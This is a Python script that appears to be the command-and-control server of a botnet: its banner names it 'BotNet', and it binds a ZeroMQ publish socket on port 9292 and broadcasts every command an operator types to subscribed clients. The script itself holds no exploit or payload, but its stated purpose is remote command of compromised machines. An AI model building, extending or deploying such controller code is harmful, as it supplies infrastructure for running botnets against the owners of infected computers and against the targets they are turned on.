import zmq
import os

ASCII_ART = r"""
     _       _ _               ______       _   _   _      _   
    | |     | | |              | ___ \     | | | \ | |    | |  
  __| |_ __ | | |_______ ______| |_/ / ___ | |_|  \| | ___| |_ 
 / _` | '_ \| | |_  / __|______| ___ \/ _ \| __| . ` |/ _ \ __|
| (_| | | | | | |/ / (__       | |_/ / (_) | |_| |\  |  __/ |_ 
 \__,_|_| |_|_|_/___\___|      \____/ \___/ \__\_| \_/\___|\__|

"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ASCII_ART)

def main():
    # Setup PUB socket for sending commands
    context = zmq.Context()
    command_socket = context.socket(zmq.PUB)
    command_socket.bind("tcp://*:9292")
    
    clear_screen()
    print("Server is running. Type commands to send (type 'exit' to stop):")
    while True:
        command = input("Command >> $").strip()
        if command.lower() == "exit":
            command_socket.send_string(command)
            break
        elif command.lower() == "help":
            print("If you need help, this is not for you.")
            break
        elif command.lower() == "clear":
            clear_screen()
            continue
        command_socket.send_string(command)
        print(f"Command sent: {command}")
    print("Server stopped.")

if __name__ == "__main__":
    main()
